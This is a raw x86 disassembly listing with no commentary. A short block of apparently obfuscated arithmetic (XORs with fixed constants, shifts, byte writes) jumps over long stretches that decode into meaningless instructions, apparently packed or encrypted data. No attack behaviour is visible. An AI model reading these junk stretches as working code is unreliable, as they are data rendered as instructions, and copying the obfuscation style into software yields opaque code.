  409bae:	add    eax,DWORD PTR ds:0x4225c8
  409bb4:	mov    DWORD PTR [ebp+0x14],eax
  409bb7:	mov    eax,DWORD PTR [ebp-0x60]
  409bba:	mov    ecx,DWORD PTR [ebp-0x5c]
  409bbd:	shrd   eax,ecx,0x2
  409bc1:	shr    ecx,0x2
  409bc4:	mov    ecx,DWORD PTR [ebp-0x60]
  409bc7:	mov    edx,DWORD PTR [ebp-0x5c]
  409bca:	xor    eax,edi
  409bcc:	shl    ecx,0x1e
  409bcf:	xor    edx,edx
  409bd1:	or     eax,edx
  409bd3:	mov    cl,BYTE PTR [ebp+eax*1-0x4]
  409bd7:	mov    eax,DWORD PTR [ebp+0x14]
  409bda:	or     BYTE PTR [eax],cl
  409bdc:	mov    eax,DWORD PTR [ebp-0x48]
  409bdf:	mov    ecx,DWORD PTR [ebp-0x44]
  409be2:	shrd   eax,ecx,0x2
  409be6:	shr    ecx,0x2
  409be9:	mov    ecx,DWORD PTR [ebp-0x48]
  409bec:	mov    edx,DWORD PTR [ebp-0x44]
  409bef:	xor    eax,edi
  409bf1:	xor    edx,edx
  409bf3:	or     eax,edx
  409bf5:	add    eax,DWORD PTR ds:0x4225c8
  409bfb:	shl    ecx,0x1e
  409bfe:	mov    DWORD PTR [ebp+0x14],eax
  409c01:	mov    eax,DWORD PTR [ebp-0x48]
  409c04:	mov    ecx,DWORD PTR [ebp-0x44]
  409c07:	shrd   eax,ecx,0x2
  409c0b:	shr    ecx,0x2
  409c0e:	mov    ecx,DWORD PTR [ebp-0x48]
  409c11:	mov    edx,DWORD PTR [ebp-0x44]
  409c14:	xor    eax,edi
  409c16:	shl    ecx,0x1e
  409c19:	xor    edx,edx
  409c1b:	or     eax,edx
  409c1d:	mov    cl,BYTE PTR [ebp+eax*1-0x4]
  409c21:	mov    eax,DWORD PTR [ebp+0x14]
  409c24:	add    BYTE PTR [eax],cl
  409c26:	mov    eax,DWORD PTR [ebp-0x38]
  409c29:	mov    ecx,DWORD PTR [ebp-0x34]
  409c2c:	shrd   eax,ecx,0x2
  409c30:	shr    ecx,0x2
  409c33:	mov    ecx,DWORD PTR [ebp-0x38]
  409c36:	mov    edx,DWORD PTR [ebp-0x34]
  409c39:	xor    edx,edx
  409c3b:	xor    eax,edi
  409c3d:	or     eax,edx
  409c3f:	add    eax,DWORD PTR ds:0x4225c8
  409c45:	shl    ecx,0x1e
  409c48:	mov    ecx,DWORD PTR [ebp-0x38]
  409c4b:	mov    edx,DWORD PTR [ebp-0x34]
  409c4e:	shrd   ecx,edx,0x2
  409c52:	xor    ecx,edi
  409c54:	shr    edx,0x2
  409c57:	mov    edx,DWORD PTR [ebp-0x38]
  409c5a:	mov    edi,DWORD PTR [ebp-0x34]
  409c5d:	xor    edi,edi
  409c5f:	or     ecx,edi
  409c61:	mov    cl,BYTE PTR [ebp+ecx*1-0x4]
  409c65:	or     BYTE PTR [eax],cl
  409c67:	shl    edx,0x1e
  409c6a:	mov    edx,DWORD PTR [ebx]
  409c6c:	mov    eax,DWORD PTR [ebx+0x4]
  409c6f:	mov    edi,DWORD PTR [ebx]
  409c71:	mov    ecx,DWORD PTR [ebx+0x4]
  409c74:	xor    edx,0xca79a577
  409c7a:	xor    eax,0x9c1b89e8
  409c7f:	shrd   edx,eax,0x2
  409c83:	xor    ecx,ecx
  409c85:	or     ecx,edx
  409c87:	mov    DWORD PTR [ebp+0x8],ecx
  409c8a:	mov    ecx,DWORD PTR [esi]
  409c8c:	mov    edx,DWORD PTR [esi+0x4]
  409c8f:	xor    edx,0x9c1b89e8
  409c95:	xor    ecx,0xca79a577
  409c9b:	mov    DWORD PTR [ebp+0x14],ecx
  409c9e:	mov    ecx,edx
  409ca0:	mov    edx,DWORD PTR [ebp+0x14]
  409ca3:	shrd   edx,ecx,0x2
  409ca7:	shr    eax,0x2
  409caa:	shl    edi,0x1e
  409cad:	mov    DWORD PTR [ebp-0x6c],eax
  409cb0:	mov    DWORD PTR [ebp-0x70],edx
  409cb3:	mov    edx,DWORD PTR [esi]
  409cb5:	mov    eax,0x40000000
  409cba:	xor    edi,eax
  409cbc:	or     edi,DWORD PTR [ebp-0x6c]
  409cbf:	mov    DWORD PTR [ebp+0x14],edx
  409cc2:	shl    DWORD PTR [ebp+0x14],0x1e
  409cc6:	xor    DWORD PTR [ebp+0x14],eax
  409cc9:	mov    DWORD PTR [ebp+0xc],edi
  409ccc:	jmp    0x40a0aa
  409cd1:	jbe    0x409d4e
  409cd3:	fstp   TBYTE PTR [edx+ebx*8-0x78e4c9e4]
  409cda:	ins    DWORD PTR es:[edi],dx
  409cdb:	cmp    DWORD PTR [eax+eiz*4+0x19],0xffffffc9
  409ce0:	jl     0x409caf
  409ce2:	cmp    DWORD PTR [eax],ebx
  409ce4:	sbb    BYTE PTR [esi+0x5f181812],bl
  409cea:	loopne 0x409cbc
  409cec:	loopne 0x409d3d
  409cee:	repz lahf 
  409cf0:	rol    BYTE PTR [edi],cl
  409cf2:	and    BYTE PTR [edi+0x2d8bd5cd],bl
  409cf8:	xor    al,0xd0
  409cfa:	mov    BYTE PTR ds:0xcd707ed8,ah
  409d00:	test   DWORD PTR [ecx-0x6d8f777f],esp
  409d06:	loopne 0x409d4d
  409d08:	xchg   esp,eax
  409d09:	adc    DWORD PTR [edi-0x4e3c716e],eax
  409d0f:	pop    eax
  409d10:	mov    eax,ds:0xdf9d8aa6
  409d15:	pop    ds
  409d16:	ja     0x409d34
  409d18:	jg     0x409d3c
  409d1a:	inc    edx
  409d1b:	or     al,0x67
  409d1d:	js     0x409cc3
  409d1f:	ins    BYTE PTR es:[edi],dx
  409d20:	xor    BYTE PTR [ecx+eax*8+0x4e],ch
  409d24:	into   
  409d25:	push   edx
  409d26:	mov    edi,DWORD PTR [edi-0x35]
  409d29:	or     esi,eax
  409d2b:	pop    ecx
  409d2c:	out    0x56,eax
  409d2e:	dec    ebp
  409d2f:	into   
  409d30:	sahf   
  409d31:	dec    eax
  409d32:	test   eax,0x133f26f6
  409d37:	sti    
  409d38:	sub    dl,al
  409d3a:	inc    eax
  409d3b:	mov    eax,ds:0xf914336b
  409d40:	rol    DWORD PTR [eax+0x2d],0x34
  409d44:	(bad)  
  409d45:	(bad)  [ebp-0x57]
  409d48:	cli    
  409d49:	aas    
  409d4a:	into   
  409d4b:	iret   
  409d4c:	add    DWORD PTR [ebp-0x23],esi
  409d4f:	pop    ebx
  409d50:	mov    esi,0x6d3c6e65
  409d55:	mov    WORD PTR [edi],?
  409d57:	dec    esi
  409d58:	fnstcw WORD PTR [esi+ebx*4]
  409d5b:	sub    al,0x5e
  409d5d:	retf   
  409d5e:	out    dx,eax
  409d5f:	add    DWORD PTR [eax+0x722ffbe9],0x95300e71
  409d69:	call   0x5ef36765
  409d6e:	aas    
  409d6f:	inc    esi
  409d70:	jmp    0xa9db:0x3ceef0a0
  409d77:	jge    0x409deb
  409d79:	push   edi
  409d7a:	and    bl,cl
  409d7c:	push   ebp
  409d7d:	xor    al,0xf1
  409d7f:	cmp    eax,0x7af9892e
  409d84:	add    bh,bh
  409d86:	mov    ebp,0xc69bcd8d
  409d8b:	iret   
  409d8c:	inc    esi
  409d8d:	adc    BYTE PTR [ebx+ecx*1+0x667b9829],dl
  409d94:	xchg   edi,eax
  409d95:	inc    esi
  409d96:	mov    al,0x74
  409d98:	daa    
  409d99:	test   BYTE PTR [edi+0x36],0x96
  409d9d:	fwait
  409d9e:	aad    0x9b
  409da0:	add    eax,edi
  409da2:	dec    ebx
  409da3:	daa    
  409da4:	or     eax,DWORD PTR [esi+ebx*4-0x6026a48d]
  409dab:	mov    bh,ch
  409dad:	and    ch,ch
  409daf:	arpl   WORD PTR [edi+0x321fa8d1],di
  409db5:	(bad)  
  409db9:	shl    BYTE PTR [esi+0x36],1
  409dbc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409dbd:	les    eax,FWORD PTR [esi]
  409dbf:	pop    ss
  409dc0:	fcomp  QWORD PTR ds:0x27fc8890
  409dc6:	test   eax,0x836d1935
  409dcb:	inc    eax
  409dcc:	ss cld 
  409dce:	xchg   edi,eax
  409dcf:	mov    ecx,0xdddc8e05
  409dd4:	jp     0x409dc6
  409dd6:	add    DWORD PTR [edi+ebp*1-0x1d691e0a],ecx
  409ddd:	call   0x4451acd3
  409de2:	sbb    al,0xc9
  409de4:	cs jge 0x409d71
  409de7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409de8:	xchg   eax,esi
  409dea:	ins    DWORD PTR es:[edi],dx
  409deb:	lods   eax,DWORD PTR ds:[esi]
  409dec:	loop   0x409d76
  409dee:	aad    0xfe
  409df0:	xchg   edi,eax
  409df1:	inc    ecx
  409df2:	loop   0x409d79
  409df4:	push   ecx
  409df5:	xor    eax,0x59c71e2a
  409dfa:	cmp    edx,DWORD PTR [edx+0x2f1ec51a]
  409e00:	xchg   DWORD PTR [eax],ecx
  409e02:	push   es
  409e03:	jmp    0x8ef68aeb
  409e08:	call   0xec368480
  409e0d:	add    DWORD PTR [ebx-0x39581f07],eax
  409e13:	mov    dh,0xa
  409e15:	add    ch,BYTE PTR [edx-0x34]
  409e18:	pop    ss
  409e19:	pushf  
  409e1a:	popf   
  409e1b:	int    0xf6
  409e1d:	ret    0xa98c
  409e20:	xchg   ebp,eax
  409e21:	cdq    
  409e22:	int3   
  409e23:	cmp    esp,edi
  409e25:	rol    DWORD PTR [edx],0x80
  409e28:	in     al,0x11
  409e2a:	pushf  
  409e2b:	jne    0x409db0
  409e2d:	test   BYTE PTR [eax-0xc13db7e],ch
  409e33:	or     al,0x9e
  409e35:	jns    0x409dca
  409e37:	or     eax,0xcdda3db0
  409e3c:	(bad)  
  409e3d:	das    
  409e3e:	xchg   esi,eax
  409e3f:	adc    eax,0x5ff26f3a
  409e44:	ret    
  409e45:	pop    ss
  409e46:	or     BYTE PTR [ebx],dh
  409e48:	jo     0x409eae
  409e4a:	shld   DWORD PTR [ecx-0x67aad6b4],edx,cl
  409e51:	mov    WORD PTR [eax+eax*8+0xe961e0c],fs
  409e58:	pushf  
  409e59:	gs imul ecx,esp,0x2c719938
  409e60:	dec    edx
  409e61:	aad    0x71
  409e63:	xlat   BYTE PTR ds:[ebx]
  409e64:	pusha  
  409e65:	or     esp,edx
  409e67:	sbb    eax,0x7c228a56
  409e6c:	fcmovu st,st(2)
  409e6e:	cmp    ecx,esp
  409e70:	mov    bh,0x36
  409e72:	add    al,0x66
  409e74:	jb     0x409ec2
  409e76:	int    0x50
  409e78:	imul   ebx,DWORD PTR [ebx-0x79],0x28d289e1
  409e7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409e80:	fbld   TBYTE PTR [eax-0x5f]
  409e83:	mov    edi,0xe02f7af6
  409e88:	(bad)  
  409e89:	not    esp
  409e8b:	add    edx,DWORD PTR [ebx]
  409e8d:	ret    0x163a
  409e90:	in     al,0x41
  409e92:	push   0xefb34c39
  409e97:	add    BYTE PTR [esi],0xa8
  409e9a:	rcr    dh,1
  409e9c:	icebp  
  409e9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409e9e:	jns    0x409ee5
  409ea0:	xchg   edx,eax
  409ea1:	retf   
  409ea2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409ea3:	xor    al,0x42
  409ea5:	and    bl,BYTE PTR ds:0x729e0c17
  409eab:	xor    esp,DWORD PTR [eax-0x6070c5c8]
  409eb1:	dec    DWORD PTR [edx-0x2e]
  409eb4:	rcr    DWORD PTR ds:[edx],1
  409eb7:	ret    
  409eb8:	mov    al,0x82
  409eba:	shl    BYTE PTR [ebx+0xfa6b06f],0x39
  409ec1:	dec    ebp
  409ec2:	call   0x129a:0x126c7271
  409ec9:	mov    edx,fs
  409ecb:	mov    dl,0x43
  409ecd:	or     DWORD PTR [edx],edi
  409ecf:	mov    ebp,0x39278582
  409ed4:	fist   DWORD PTR [ebx]
  409ed6:	sti    
  409ed7:	call   0x2749:0x7a90b89a
  409ede:	sbb    al,dl
  409ee0:	push   esp
  409ee1:	leave  
  409ee2:	sbb    al,0x7b
  409ee4:	fbld   TBYTE PTR [ebx+0x1f]
  409ee7:	fdiv   st(2),st
  409ee9:	sti    
  409eea:	jp     0x409f02
  409eec:	xor    ecx,DWORD PTR [edi-0x46b61d36]
  409ef2:	mul    ah
  409ef4:	sti    
  409ef5:	fsubr  QWORD PTR [eax+ebx*8+0x6d]
  409ef9:	mov    bh,0xd
  409efb:	xchg   BYTE PTR [eax+0x5],dh
  409efe:	sbb    al,0xc7
  409f00:	mov    ebx,0xa872f240
  409f05:	jl     0x409f11
  409f07:	dec    dl
  409f09:	xor    bl,dh
  409f0b:	mov    cl,0xbf
  409f0d:	and    BYTE PTR [ebp+0x4f097162],dh
  409f13:	sbb    DWORD PTR [edi-0x65438cf1],ecx
  409f19:	adc    dh,BYTE PTR [ebp+0x4bdd34ef]
  409f1f:	push   eax
  409f20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409f21:	inc    ebx
  409f22:	enter  0x6539,0x1
  409f26:	mov    ah,0x7d
  409f28:	push   ss
  409f29:	stc    
  409f2a:	dec    edx
  409f2b:	(bad)  
  409f2c:	(bad)  
  409f2d:	jns    0x409ef9
  409f2f:	fld    QWORD PTR [esi-0x14]
  409f32:	lds    ecx,FWORD PTR [ebp+0x7b6cf8b2]
  409f38:	iret   
  409f39:	xchg   esp,eax
  409f3a:	stos   DWORD PTR es:[edi],eax
  409f3b:	or     dl,al
  409f3d:	add    bh,cl
  409f3f:	mov    al,0xec
  409f41:	iret   
  409f42:	pop    esi
  409f43:	jg     0x409ecb
  409f45:	inc    ebx
  409f46:	sub    BYTE PTR [esi-0x4215bcda],ah
  409f4c:	jmp    0x409f3f
  409f4e:	sub    DWORD PTR [eax+eax*2],ebp
  409f51:	sahf   
  409f52:	shl    DWORD PTR [esi],cl
  409f54:	dec    eax
  409f55:	je     0x409f12
  409f57:	xchg   dl,ah
  409f59:	xor    DWORD PTR [ebx],edi
  409f5b:	mov    al,ds:0x4fc5a01f
  409f60:	cwde   
  409f61:	mov    ebp,0x126f229c
  409f66:	rol    ah,1
  409f68:	(bad)  
  409f69:	sub    al,0x4f
  409f6b:	mov    WORD PTR [ecx-0x18],ds
  409f6e:	mov    ebx,0x6969f5d0
  409f73:	sbb    DWORD PTR [edx+0x8],eax
  409f76:	xchg   BYTE PTR [ebp-0x12760d33],bh
  409f7c:	lods   al,BYTE PTR ds:[esi]
  409f7d:	lods   eax,DWORD PTR ds:[esi]
  409f7e:	xchg   esi,eax
  409f7f:	jg     0x409f7b
  409f81:	aaa    
  409f82:	and    al,0x97
  409f84:	pop    ds
  409f85:	dec    esi
  409f86:	mov    bl,0xd3
  409f88:	mov    DWORD PTR [ecx],ecx
  409f8a:	push   0x20a0f357
  409f8f:	adc    eax,0x1b051421
  409f94:	fdivr  QWORD PTR [ebp-0x75e0d733]
  409f9a:	or     al,0x1b
  409f9c:	push   ecx
  409f9d:	popa   
  409f9e:	add    DWORD PTR [edi+0x5c0a4153],ebx
  409fa4:	adc    ah,BYTE PTR [edi-0x73]
  409fa7:	rcl    BYTE PTR [ebp-0x79ee02ce],cl
  409fad:	mov    ecx,0x1b48ccc6
  409fb2:	in     al,0x6d
  409fb4:	pop    edx
  409fb5:	mov    ch,0xc8
  409fb7:	cmp    BYTE PTR [esi-0xa],bh
  409fba:	mov    al,ds:0xa1e8718b
  409fbf:	out    0x98,al
  409fc1:	sub    ebx,ebx
  409fc3:	jge    0x40a00f
  409fc5:	repnz dec ebx
  409fc7:	add    eax,0xe911972e
  409fcc:	mov    dl,0xcd
  409fce:	or     ah,BYTE PTR [eax-0x6d]
  409fd1:	jno    0x409fce
  409fd3:	mov    edi,0x6a474884
  409fd8:	xchg   ecx,eax
  409fd9:	jnp    0x409fc6
  409fdb:	jns    0x409f92
  409fdd:	push   0x5b
  409fdf:	sbb    ebx,ecx
  409fe1:	push   0x187a4abd
  409fe6:	add    al,0x88
  409fe8:	adc    edx,DWORD PTR ds:0xcba68963
  409fee:	push   edx
  409fef:	inc    edi
  409ff0:	je     0x409fca
  409ff2:	les    esp,FWORD PTR [edi-0x56]
  409ff5:	mov    ds:0x7eb8412e,eax
  409ffa:	mov    bh,BYTE PTR [ebx+ebp*8+0x4e]
  409ffe:	sbb    ebx,esp
  40a000:	lds    edi,FWORD PTR [ecx+0x22]
  40a003:	adc    BYTE PTR [edi-0x3c01fd99],bh
  40a009:	iret   
  40a00a:	jns    0x40a049
  40a00c:	pop    eax
  40a00d:	sahf   
  40a00e:	arpl   WORD PTR [ebx+0x5e],sp
  40a011:	movlps QWORD PTR [edx+0x3e],xmm2
  40a015:	cli    
  40a016:	les    ebx,FWORD PTR [edx-0x31]
  40a019:	xor    al,cl
  40a01b:	mov    DWORD PTR [eax-0xb6bce34],esp
  40a021:	mov    ds:0xeeb3b60e,eax
  40a026:	retf   0x2ac4
  40a029:	(bad)  [eax]
  40a02b:	test   DWORD PTR [ebp+0x78545907],0xd95ff424
  40a035:	stc    
  40a036:	aaa    
  40a037:	addr16 push edx
  40a039:	add    eax,0xc43c8d3f
  40a03e:	inc    esi
  40a03f:	lahf   
  40a040:	add    BYTE PTR [edx],al
  40a042:	das    
  40a043:	aaa    
  40a044:	adc    al,0x40
  40a046:	sub    al,0xd5
  40a048:	add    al,dh
  40a04a:	mov    ebx,0x5501edba
  40a04f:	push   ebp
  40a050:	pop    ebx
  40a051:	fsubr  QWORD PTR [ecx+ebp*4+0x1e]
  40a055:	arpl   WORD PTR [ebp+ebp*4+0x38],cx
  40a059:	push   ebp
  40a05a:	pop    ds
  40a05b:	fld    QWORD PTR [ecx]
  40a05d:	(bad)  
  40a05e:	sar    ebx,1
  40a060:	sub    cl,BYTE PTR [edx-0x7b2a0c66]
  40a066:	aaa    
  40a067:	sar    dh,0x42
  40a06a:	mov    eax,0x4a117f74
  40a06f:	jo     0x40a0a4
  40a071:	dec    esp
  40a072:	shl    dh,0x7
  40a075:	mov    ah,0xb5
  40a077:	dec    esi
  40a078:	inc    esp
  40a079:	inc    edx
  40a07a:	leave  
  40a07b:	pop    ecx
  40a07c:	xchg   esi,eax
  40a07d:	pop    esi
  40a07e:	pop    ecx
  40a07f:	outs   dx,BYTE PTR ds:[esi]
  40a080:	jno    0x40a0a0
  40a082:	mov    dl,BYTE PTR [edi-0x467a4577]
  40a088:	lahf   
  40a089:	dec    esi
  40a08a:	ins    BYTE PTR es:[edi],dx
  40a08b:	les    edx,FWORD PTR [eax]
  40a08d:	ss xchg ebx,eax
  40a08f:	mov    DWORD PTR [ecx-0x4d],ebx
  40a092:	lea    esi,[esi]
  40a094:	outs   dx,DWORD PTR ds:[esi]
  40a095:	out    dx,eax
  40a096:	hlt    
  40a097:	xchg   edi,eax
  40a098:	and    BYTE PTR [ebp+0x2a682620],0x2f
  40a09f:	xchg   esp,eax
  40a0a0:	adc    esp,DWORD PTR [ebx+0x2c625eaa]
  40a0a6:	inc    ebx
  40a0a7:	xchg   ebp,eax
  40a0a8:	retf   
  40a0a9:	sti    
  40a0aa:	mov    edi,DWORD PTR [esi+0x4]
  40a0ad:	mov    edi,DWORD PTR [ebp+0x14]
  40a0b0:	xor    edx,edx
  40a0b2:	or     edx,DWORD PTR [ebp-0x70]
  40a0b5:	shr    ecx,0x2
  40a0b8:	or     edi,ecx
  40a0ba:	cmp    edx,DWORD PTR [ebp+0x8]
  40a0bd:	jne    0x40a9b0
  40a0c3:	cmp    edi,DWORD PTR [ebp+0xc]
  40a0c6:	jne    0x40a9b0
  40a0cc:	jmp    0x40a926
  40a0d1:	mov    eax,DWORD PTR [esi]
  40a0d3:	mov    edx,DWORD PTR [esi+0x4]
  40a0d6:	mov    eax,DWORD PTR [esi]
  40a0d8:	mov    edx,DWORD PTR [esi+0x4]
  40a0db:	xor    eax,0xca79a577
  40a0e0:	xor    edx,ecx
  40a0e2:	mov    ecx,eax
  40a0e4:	mov    eax,edx
  40a0e6:	shrd   ecx,eax,0x2
  40a0ea:	shr    eax,0x2
  40a0ed:	mov    DWORD PTR [ebp+0xc],eax
  40a0f0:	mov    eax,DWORD PTR [esi]
  40a0f2:	mov    edx,DWORD PTR [esi+0x4]
  40a0f5:	mov    edx,eax
  40a0f7:	xor    eax,eax
  40a0f9:	or     eax,ecx
  40a0fb:	mov    ecx,DWORD PTR [ebx]
  40a0fd:	shl    edx,0x1e
  40a100:	xor    edx,0x40000000
  40a106:	mov    DWORD PTR [ebp+0x10],eax
  40a109:	mov    eax,edx
  40a10b:	or     eax,DWORD PTR [ebp+0xc]
  40a10e:	mov    edx,DWORD PTR [ebx+0x4]
  40a111:	push   eax
  40a112:	push   DWORD PTR [ebp+0x10]
  40a115:	push   edx
  40a116:	push   ecx
  40a117:	jmp    0x40a4f5
  40a11c:	std    
  40a11d:	dec    ecx
  40a11e:	mov    ah,0xd2
  40a120:	sub    al,0x22
  40a122:	fidivr DWORD PTR [edi]
  40a124:	test   al,0x29
  40a126:	push   ebp
  40a127:	stos   BYTE PTR es:[edi],al
  40a128:	jne    0x40a12c
  40a12a:	jnp    0x40a0dc
  40a12c:	push   edx
  40a12d:	xor    ebx,DWORD PTR [eax]
  40a12f:	sbb    BYTE PTR [esi+0x50181812],bl
  40a135:	mov    dl,0xa5
  40a137:	das    
  40a138:	std    
  40a139:	call   0xb25b:0x4c46a875
  40a140:	mov    ebx,0x52944401
  40a145:	gs in  al,0x56
  40a148:	and    eax,0xf6bb9dda
  40a14d:	xchg   ebp,eax
  40a14e:	jmp    0x1aee2f0
  40a153:	mov    edx,0x8983cf7e
  40a158:	pushf  
  40a159:	mov    ch,0x38
  40a15b:	fmul   st(3),st
  40a15d:	mov    esi,0x5546294b
  40a162:	push   ebx
  40a163:	jmp    0xd3d1ff9d
  40a168:	outs   dx,BYTE PTR ds:[esi]
  40a169:	inc    BYTE PTR [ebx]
  40a16b:	xlat   BYTE PTR ds:[ebx]
  40a16c:	fcmovne st,st(6)
  40a16e:	shr    BYTE PTR [eax],cl
  40a170:	ja     0x40a169
  40a172:	push   eax
  40a173:	push   0x3b
  40a175:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a176:	in     al,0x29
  40a178:	and    al,0x59
  40a17a:	or     BYTE PTR [ebx+0x69],bh
  40a17d:	retf   
  40a17e:	or     BYTE PTR [edi+0x3a],al
  40a181:	fadd   st,st(4)
  40a183:	ins    BYTE PTR es:[edi],dx
  40a184:	adc    BYTE PTR [ecx+eiz*2],dl
  40a187:	stc    
  40a188:	lods   al,BYTE PTR ds:[esi]
  40a189:	jle    0x40a17d
  40a18b:	ds push edi
  40a18d:	out    0x1c,al
  40a18f:	xchg   esp,eax
  40a190:	push   ds
  40a191:	ja     0x40a16d
  40a193:	out    dx,al
  40a194:	repz iret 
  40a196:	xor    al,0x9f
  40a198:	xchg   ebp,eax
  40a199:	push   edi
  40a19a:	add    edx,DWORD PTR [edi-0x12]
  40a19d:	popf   
  40a19e:	mov    bl,0x68
  40a1a0:	fadd   DWORD PTR [ecx-0x18f399d2]
  40a1a6:	neg    BYTE PTR [ebp+0x3b]
  40a1a9:	sub    al,0x94
  40a1ab:	mov    al,0x84
  40a1ad:	inc    ecx
  40a1ae:	into   
  40a1af:	enter  0xd2cb,0x3a
  40a1b3:	imul   esi,DWORD PTR [edi],0xffffffde
  40a1b6:	mov    ebp,0x184e6d37
  40a1bb:	not    DWORD PTR [edx+edi*2]
  40a1be:	mov    DWORD PTR [ecx-0x6a472dec],ebx
  40a1c4:	aaa    
  40a1c5:	jns    0x40a16d
  40a1c7:	or     edx,ebp
  40a1c9:	loop   0x40a223
  40a1cb:	out    0xe4,al
  40a1cd:	mov    bl,0xee
  40a1cf:	out    dx,eax
  40a1d0:	jbe    0x40a1f6
  40a1d2:	inc    edx
  40a1d3:	jns    0x40a210
  40a1d5:	int    0xa4
  40a1d7:	lahf   
  40a1d8:	stos   BYTE PTR es:[edi],al
  40a1d9:	rcl    DWORD PTR [eax+0x32291980],0xc3
  40a1e0:	push   ds
  40a1e1:	xor    BYTE PTR [edi-0x254ca8c2],0x42
  40a1e8:	adc    esi,DWORD PTR [ecx-0x5bd7921a]
  40a1ee:	out    dx,al
  40a1ef:	enter  0x2397,0x3c
  40a1f3:	or     BYTE PTR [edx-0x62a94d5a],dh
  40a1f9:	ins    DWORD PTR es:[edi],dx
  40a1fa:	jp     0x40a23d
  40a1fc:	push   esp
  40a1fd:	test   eax,0xcd9c7061
  40a202:	mov    esp,0x9aa04510
  40a207:	mov    edx,0xaa32303c
  40a20c:	out    0x7,al
  40a20e:	or     ch,al
  40a210:	xchg   ebp,eax
  40a211:	push   esi
  40a212:	mov    bh,0xb3
  40a214:	or     DWORD PTR [ebp-0xe291c2d],esi
  40a21a:	or     BYTE PTR [ebp-0x54],bl
  40a21d:	lods   eax,DWORD PTR ds:[esi]
  40a21e:	jo     0x40a1e3
  40a220:	jae    0x40a229
  40a222:	hlt    
  40a223:	adc    bl,cl
  40a225:	mov    ds:0x59e07f5,eax
  40a22a:	fmul   DWORD PTR ds:0x20122734
  40a230:	or     bh,BYTE PTR [eax+eax*8-0x5a68e1a4]
  40a237:	test   al,0x89
  40a239:	(bad)  
  40a23a:	stos   DWORD PTR es:[edi],eax
  40a23b:	cmp    eax,0xd74290bc
  40a240:	loop   0x40a2b1
  40a242:	or     eax,0x9d856173
  40a247:	aas    
  40a248:	cs jnp 0x40a2a1
  40a24b:	and    al,0x95
  40a24d:	retf   0xd991
  40a250:	and    esp,esi
  40a252:	sub    BYTE PTR [edx-0x5944b50a],dh
  40a258:	ja     0x40a241
  40a25a:	push   cs
  40a25b:	jne    0x40a21f
  40a25d:	xchg   ebp,eax
  40a25e:	arpl   WORD PTR [ebp-0x67],sp
  40a261:	dec    edx
  40a262:	dec    ebx
  40a263:	loopne 0x40a273
  40a265:	cmp    al,BYTE PTR [edi]
  40a267:	stc    
  40a268:	or     eax,DWORD PTR [edx]
  40a26a:	(bad)  
  40a26b:	cmp    DWORD PTR [ecx-0x2b11472f],eax
  40a271:	add    ch,dh
  40a273:	and    edi,DWORD PTR [edi+0xb]
  40a276:	jno    0x40a27e
  40a278:	(bad)  
  40a279:	push   edi
  40a27a:	inc    esi
  40a27b:	es rcr esp,0x94
  40a27f:	lods   al,BYTE PTR ds:[esi]
  40a280:	push   0x3591049c
  40a285:	js     0x40a254
  40a287:	adc    BYTE PTR [edx-0x10],bh
  40a28a:	and    BYTE PTR [eax],al
  40a28c:	and    bl,bh
  40a28e:	jle    0x40a28c
  40a290:	push   ss
  40a291:	nop
  40a292:	and    edx,DWORD PTR [esi-0xb]
  40a295:	mov    ah,0x1
  40a297:	jb     0x40a263
  40a299:	inc    esp
  40a29a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a29b:	dec    esi
  40a29c:	pop    ebp
  40a29d:	dec    esp
  40a29e:	pop    ebx
  40a29f:	addr16 xor al,0x3d
  40a2a2:	cli    
  40a2a3:	mov    edi,0x8d4d4b6c
  40a2a8:	leave  
  40a2a9:	push   es
  40a2aa:	cdq    
  40a2ab:	ds je  0x40a2ed
  40a2ae:	fcmovbe st,st(6)
  40a2b0:	or     BYTE PTR [eax-0x26570707],ah
  40a2b6:	cmp    BYTE PTR [edi],0xab
  40a2b9:	and    DWORD PTR [esi+0x36b00957],edx
  40a2bf:	cli    
  40a2c0:	dec    ebx
  40a2c1:	repz out dx,eax
  40a2c3:	addr16 data16 xor al,0xcf
  40a2c7:	aad    0xa
  40a2c9:	sbb    cl,BYTE PTR ds:0xdc385edf
  40a2cf:	jno    0x40a2cd
  40a2d1:	push   edx
  40a2d2:	imul   eax,eax,0x69
  40a2d5:	xor    DWORD PTR [ecx-0x4c118a18],esi
  40a2db:	hlt    
  40a2dc:	xchg   ebx,eax
  40a2dd:	imul   ebp,DWORD PTR [edx],0xb91ed022
  40a2e3:	mov    WORD PTR [ecx-0x3],gs
  40a2e6:	push   esi
  40a2e7:	and    al,0x11
  40a2e9:	stos   BYTE PTR es:[edi],al
  40a2ea:	lds    ecx,FWORD PTR [eax-0x106e3fb9]
  40a2f0:	ins    DWORD PTR es:[edi],dx
  40a2f1:	push   edx
  40a2f2:	jns    0x40a31c
  40a2f4:	cmp    eax,0x435b6b56
  40a2f9:	je     0x40a31e
  40a2fb:	dec    esp
  40a2fc:	test   eax,0x4140064e
  40a301:	popf   
  40a302:	std    
  40a303:	and    al,0xb2
  40a305:	test   eax,0xe5b013c3
  40a30a:	xor    bl,dl
  40a30c:	xchg   edi,eax
  40a30d:	pushf  
  40a30e:	dec    ebp
  40a30f:	mov    BYTE PTR [edi-0x4bc50538],ah
  40a315:	cmc    
  40a316:	call   0x8516:0x9dfe920a
  40a31d:	sbb    DWORD PTR [eax],esi
  40a31f:	(bad)  
  40a320:	dec    edi
  40a321:	or     DWORD PTR [edx+0x22],edi
  40a324:	fstp   TBYTE PTR [edx+0x282594dc]
  40a32a:	and    edx,edi
  40a32c:	es push eax
  40a32e:	in     eax,0x75
  40a330:	rcl    DWORD PTR [ebx+0x66b200f1],1
  40a336:	(bad)  
  40a337:	jmp    0x2d1a:0x9001b810
  40a33e:	idiv   BYTE PTR [ecx-0x7623b0e0]
  40a344:	(bad)  
  40a345:	dec    ebp
  40a346:	push   ebx
  40a347:	dec    edi
  40a348:	fdivr  QWORD PTR [esi+0x5ea1274c]
  40a34e:	adc    eax,0x919b37d0
  40a353:	cmp    BYTE PTR [edx*1-0x12a64352],bh
  40a35a:	ja     0x40a2e4
  40a35c:	dec    esi
  40a35d:	out    dx,eax
  40a35e:	lds    edx,FWORD PTR [ebx+0x76e361bd]
